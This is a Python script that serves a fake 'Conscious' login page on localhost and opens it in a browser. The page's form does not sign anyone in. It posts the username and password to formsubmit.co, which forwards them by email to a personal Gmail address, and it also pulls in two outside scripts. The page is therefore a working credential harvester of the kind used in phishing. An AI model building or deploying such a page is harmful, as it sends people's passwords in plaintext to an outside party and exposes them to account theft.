import http.server
import socketserver
import webbrowser
import os
import tempfile
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Conscious - Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f4f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }

    h1 {
      margin-bottom: 30px;
      color: #2c3e50;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      padding: 10px 20px;
      background-color: #2c3e50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #1a252f;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Conscious</h1>
    <form action="https://formsubmit.co/ishaanmittalnewstar@gmail.com" method="POST">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>

      <!-- Optional Hidden Input to Customize FormSubmit -->
      <input type="hidden" name="_subject" value="New Login Attempt - Conscious">
      <input type="hidden" name="_template" value="table">

      <button type="submit">Login</button>
    </form>
  </div>
<!-- Static App Form Collection Script -->
<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>

<script src="https://static.app/js/static.js" type="text/javascript"></script>
</body>
</html>

"""
temp_dir = tempfile.TemporaryDirectory()
html_path = os.path.join(temp_dir.name, "index.html")

with open(html_path, "w", encoding="utf-8") as f:
    f.write(html_code)
os.chdir(temp_dir.name)
PORT = 8000
url = f"http://localhost:{PORT}/index.html"

Handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at {url}")
    webbrowser.open(url)  # Open in default browser
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")